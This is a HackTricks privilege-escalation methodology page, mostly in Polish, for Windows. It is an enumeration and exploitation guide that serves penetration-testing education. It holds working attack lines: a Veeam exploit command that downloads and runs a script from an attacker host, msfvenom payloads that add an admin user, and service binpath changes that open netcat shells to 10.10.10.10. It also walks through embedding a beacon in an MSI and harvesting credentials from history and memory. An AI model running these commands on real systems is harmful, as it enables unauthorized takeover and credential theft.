# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do szukania wektorów Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Początkowa teoria Windows

### Access Tokens

**Jeśli nie wiesz, czym są Windows Access Tokens, przeczytaj poniższą stronę przed kontynuowaniem:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sprawdź poniższą stronę, aby uzyskać więcej informacji o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Jeśli nie wiesz, czym są integrity levels w Windows, powinieneś przeczytać poniższą stronę przed kontynuowaniem:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

W Windows istnieją różne rzeczy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykryć twoją aktywność**. Powinieneś **przeczytać** następującą **stronę** i **enumerować** wszystkie te **mechanizmy obronne** przed rozpoczęciem enumeracji pod kątem privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Procesy UIAccess uruchamiane przez `RAiLaunchAdminProcess` mogą być nadużyte, aby osiągnąć High IL bez promptów, gdy kontrola secure-path AppInfo zostanie obejta. Sprawdź tutaj dedykowany workflow obejścia UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacja rejestru dostępności Secure Desktop może zostać nadużyta do arbitralnego zapisu do rejestru SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Najnowsze buildy Windows wprowadziły też ścieżkę LPE przez **SMB arbitrary-port**, gdzie uprzywilejowana lokalna autentykacja NTLM jest odbijana przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Sprawdź, czy wersja Windows ma jakąś znaną podatność (sprawdź też zastosowane poprawki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits wersji

Ta [site](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji o podatnościach Microsoft security. Ta baza danych zawiera ponad 4,700 security vulnerabilities, pokazując **massive attack surface**, jaki oferuje środowisko Windows.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_

**Lokalnie z informacjami systemowymi**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych env zapisano jakieś credential/Juicy info?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkryptów PowerShell

Możesz dowiedzieć się, jak to włączyć w [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Szczegóły wykonań potoku PowerShell są rejestrowane, obejmując wykonywane polecenia, wywołania poleceń oraz fragmenty skryptów. Jednak pełne szczegóły wykonania i wyniki wyjściowe mogą nie zostać przechwycone.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Transcript files" dokumentacji, wybierając **"Module Logging"** zamiast **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z logów PowersShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Kompletny zapis aktywności i pełnej zawartości wykonania skryptu jest przechwytywany, zapewniając, że każdy blok kodu jest dokumentowany podczas jego działania. Proces ten zachowuje kompleksowy ślad audytowy każdej aktywności, przydatny do analizy forensic i analizowania złośliwego zachowania. Poprzez dokumentowanie całej aktywności w momencie wykonania, dostarczane są szczegółowe informacje o procesie.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Dziennikowanie zdarzeń dla Script Block można znaleźć w Windows Event Viewer pod ścieżką: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić ostatnie 20 zdarzeń, możesz użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia Internetu
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Dyski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz przejąć system, jeśli aktualizacje nie są pobierane przez http**S**, tylko przez http.

Zaczynasz od sprawdzenia, czy sieć używa nie-SSL WSUS update, uruchamiając poniższe w cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Albo następujące w PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Jeśli otrzymasz odpowiedź, taką jak jedna z tych:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **jest to podatne na exploit.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Usługa wykonuje polecenie jako SYSTEM.
## KrbRelayUp

Istnieje podatność na **local privilege escalation** w środowiskach Windows **domain** w określonych warunkach. Warunki te obejmują środowiska, w których **LDAP signing is not enforced,** użytkownicy mają prawa własne pozwalające im konfigurować **Resource-Based Constrained Delegation (RBCD),** oraz możliwość tworzenia komputerów w obrębie domeny. Warto zauważyć, że te **requirements** są spełnione przy użyciu **default settings**.

Znajdź **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Więcej informacji o przebiegu ataku znajdziesz tutaj [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Jeśli** te 2 registers są **enabled** (wartość to **0x1**), to użytkownicy o dowolnych uprawnieniach mogą **install** (uruchamiać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloady Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj komendy `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik Windows MSI do eskalacji uprawnień. Ten skrypt zapisuje wcześniej skompilowany instalator MSI, który wyświetla monit o dodanie użytkownika/grupy (więc będziesz potrzebować dostępu GIU):
```
Write-UserAddMSI
```
Po prostu uruchom utworzony binarny plik, aby podnieść uprawnienia.

### MSI Wrapper

Przeczytaj ten tutorial, aby dowiedzieć się, jak utworzyć wrapper MSI przy użyciu tego narzędzia. Pamiętaj, że możesz owinąć plik "**.bat**", jeśli **po prostu** chcesz **wykonać** **linie poleceń**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** za pomocą Cobalt Strike lub Metasploit **nowy Windows EXE TCP payload** w `C:\privesc\beacon.exe`
- Otwórz **Visual Studio**, wybierz **Create a new project** i wpisz "installer" w polu wyszukiwania. Wybierz projekt **Setup Wizard** i kliknij **Next**.
- Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, wybierz **place solution and project in the same directory** i kliknij **Create**.
- Klikaj **Next**, aż dojdziesz do kroku 3 z 4 (choose files to include). Kliknij **Add** i wybierz wygenerowany przed chwilą payload Beacon. Następnie kliknij **Finish**.
- Zaznacz projekt **AlwaysPrivesc** w **Solution Explorer** i w **Properties** zmień **TargetPlatform** z **x86** na **x64**.
- Istnieją inne właściwości, które możesz zmienić, takie jak **Author** i **Manufacturer**, co może sprawić, że instalowana aplikacja będzie wyglądać bardziej legalnie.
- Kliknij prawym przyciskiem myszy projekt i wybierz **View > Custom Actions**.
- Kliknij prawym przyciskiem myszy **Install** i wybierz **Add Custom Action**.
- Kliknij dwukrotnie **Application Folder**, wybierz plik **beacon.exe** i kliknij **OK**. To zapewni, że payload beacon zostanie wykonany zaraz po uruchomieniu instalatora.
- W **Custom Action Properties** zmień **Run64Bit** na **True**.
- Na koniec **build it**.
- Jeśli pojawi się ostrzeżenie `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, upewnij się, że ustawiono platformę na x64.

### MSI Installation

Aby wykonać **instalację** złośliwego pliku `.msi` w **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Te ustawienia decydują o tym, co jest **logowane**, więc powinieneś zwrócić uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, jest interesujące, aby wiedzieć, gdzie są wysyłane logi
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** jest przeznaczony do **zarządzania hasłami lokalnego Administratora**, zapewniając, że każde hasło jest **unikalne, losowe i regularnie aktualizowane** na komputerach dołączonych do domeny. Te hasła są bezpiecznie przechowywane w Active Directory i mogą być dostępne tylko dla użytkowników, którzy otrzymali wystarczające uprawnienia poprzez ACLs, co pozwala im przeglądać hasła lokalnego admina, jeśli są do tego uprawnieni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Jeśli aktywny, **hasła w plain-text są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ochrona LSA

Począwszy od **Windows 8.1**, Microsoft wprowadził ulepszoną ochronę Local Security Authority (LSA), aby **blokować** próby zaufanych procesów do **odczytu jego pamięci** lub wstrzykiwania kodu, dodatkowo zabezpieczając system.\
[**Więcej informacji o LSA Protection tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** zostało wprowadzone w **Windows 10**. Jego celem jest zabezpieczenie poświadczeń przechowywanych na urządzeniu przed zagrożeniami takimi jak ataki pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Poświadczenia w pamięci podręcznej

**Poświadczenia domenowe** są uwierzytelniane przez **Local Security Authority** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika są uwierzytelniane przez zarejestrowany pakiet zabezpieczeń, zwykle tworzone są poświadczenia domenowe dla tego użytkownika.\
[**Więcej informacji o Cached Credentials tutaj**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i grupy

### Wyliczanie użytkowników i grup

Powinieneś sprawdzić, czy któraś z grup, do których należysz, ma interesujące uprawnienia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Uprzywilejowane grupy

Jeśli **należysz do jakiejś uprzywilejowanej grupy, możesz być w stanie podnieść uprawnienia**. Dowiedz się więcej o uprzywilejowanych grupach i o tym, jak je nadużywać do podnoszenia uprawnień tutaj:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacja tokenami

**Dowiedz się więcej** o tym, czym jest **token** na tej stronie: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sprawdź następną stronę, aby **dowiedzieć się o interesujących tokenach** i o tym, jak je nadużywać:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Foldery domowe
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka haseł
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

Przede wszystkim, wylistowując procesy **sprawdź, czy w linii poleceń procesu nie ma haseł**.\
Sprawdź, czy możesz **nadpisać jakiś uruchomiony plik binarny** albo czy masz uprawnienia zapisu do folderu z binariami, aby wykorzystać możliwe [**ataki DLL Hijacking**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj, czy działają możliwe [**electron/cef/chromium debuggers**](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md), możesz to nadużyć, aby podnieść uprawnienia.

**Sprawdzanie uprawnień binariów procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów binariów procesów (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mining haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP mają **poświadczenia w jawnym tekście w pamięci**, spróbuj zrzucić pamięć i odczytać poświadczenia.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niebezpieczne aplikacje GUI

**Aplikacje uruchomione jako SYSTEM mogą pozwalać użytkownikowi na uruchomienie CMD albo przeglądanie katalogów.**

Przykład: "Windows Help and Support" (Windows + F1), wyszukaj "command prompt", kliknij "Click to open Command Prompt"

## Usługi

Service Triggers pozwalają Windows uruchomić usługę, gdy wystąpią określone warunki (aktywność named pipe/RPC endpoint, zdarzenia ETW, dostępność IP, pojawienie się urządzenia, odświeżenie GPO itp.). Nawet bez uprawnień SERVICE_START często można uruchamiać uprzywilejowane usługi, wyzwalając ich triggery. Zobacz techniki enumeracji i aktywacji tutaj:

-
{{#ref}}
service-triggers.md
{{#endref}}

Uzyskaj listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc** do uzyskania informacji o usłudze
```bash
sc qc <service_name>
```
Zaleca się mieć binarkę **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzić, czy "Authenticated Users" mogą modyfikować jakąkolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli masz ten błąd (na przykład z SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Możesz ją włączyć używając
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Weź pod uwagę, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym obejściem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

W scenariuszu, w którym grupa "Authenticated users" posiada **SERVICE_ALL_ACCESS** na usłudze, możliwa jest modyfikacja pliku wykonywalnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Uruchom ponownie usługę
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia mogą zostać podniesione przez różne permisje:

- **SERVICE_CHANGE_CONFIG**: Umożliwia rekonfigurację binarnego pliku usługi.
- **WRITE_DAC**: Włącza rekonfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usługi.
- **WRITE_OWNER**: Pozwala na przejęcie własności i rekonfigurację uprawnień.
- **GENERIC_WRITE**: Dziedziczy możliwość zmiany konfiguracji usługi.
- **GENERIC_ALL**: Również dziedziczy możliwość zmiany konfiguracji usługi.

Do wykrywania i eksploatacji tej podatności można wykorzystać _exploit/windows/local/service_permissions_.

### Services binaries weak permissions

**Sprawdź, czy możesz zmodyfikować binary wykonywany przez usługę** albo czy masz **write permissions na folder**, w którym znajduje się ten binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Możesz uzyskać każdy binary wykonywany przez usługę za pomocą **wmic** (nie w system32) i sprawdzić swoje uprawnienia używając **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz także użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Uprawnienia do modyfikacji rejestru usług

Powinieneś sprawdzić, czy możesz modyfikować jakikolwiek rejestr usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi, wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, binarny plik uruchamiany przez usługę może zostać zmodyfikowany.

Aby zmienić Path binarnego pliku, który jest uruchamiany:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Wyścig symbolic link w Registry do dowolnego zapisu wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu Windows tworzą per-user klucze **ATConfig**, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. Wyścig **symbolic link** w registry może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, dając primitive **arbitrary HKLM value write**.

Kluczowe lokalizacje (przykład: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listuje zainstalowane funkcje ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje kontrolowaną przez użytkownika konfigurację.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logon/secure-desktop transitions i jest zapisywalny przez użytkownika.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Wypełnij wartość **HKCU ATConfig**, którą chcesz, aby SYSTEM zapisał.
2. Wyzwól kopiowanie secure-desktop (np. **LockWorkstation**), które uruchamia AT broker flow.
3. **Wygraj race** przez założenie **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zadziała, podmień klucz **HKLM Session ATConfig** na **registry link** do chronionego celu HKLM.
4. SYSTEM zapisze wybraną przez atakującego wartość do przekierowanej ścieżki HKLM.

Gdy masz już arbitralny zapis wartości HKLM, przejdź do LPE przez nadpisanie wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą zwykły użytkownik może uruchomić (np. **`msiserver`**) i wyzwól ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje workstation** jako część race.

Przykładowe narzędzia (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Uprawnienia Services registry AppendData/AddSubdirectory

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć z niego podrejestry**. W przypadku Windows services to **wystarcza do wykonania arbitralnego kodu:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do executable nie jest ujęta w cudzysłów, Windows spróbuje wykonać każdy końcowy fragment przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje wykonać:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Wypisz wszystkie niecytowane ścieżki usług, z wyłączeniem tych należących do wbudowanych usług Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
